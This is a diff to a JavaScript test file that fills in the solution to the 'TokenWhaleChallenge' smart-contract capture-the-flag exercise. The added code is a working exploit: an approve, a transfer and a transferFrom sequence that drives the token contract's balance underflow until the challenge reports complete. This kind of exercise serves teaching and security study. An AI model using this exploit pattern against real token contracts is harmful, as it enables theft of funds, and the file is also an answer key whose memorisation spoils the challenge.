@@ -21,9 +21,16 @@ describe('TokenWhaleChallenge', () => {
   });
 
   it('exploit', async () => {
-    /**
-     * YOUR CODE HERE
-     * */
+    const approveTx = await target.connect(deployer).approve(attacker.address, 1000);
+    await approveTx.wait();
+
+    const transferTx = await target.connect(attacker).transfer(deployer.address, 501);
+    await transferTx.wait();
+
+    const transferFromTx = await target
+      .connect(attacker)
+      .transferFrom(deployer.address, "0x0000000000000000000000000000000000000000", 500);
+    await transferFromTx.wait();
 
     expect(await target.isComplete()).to.equal(true);
   });
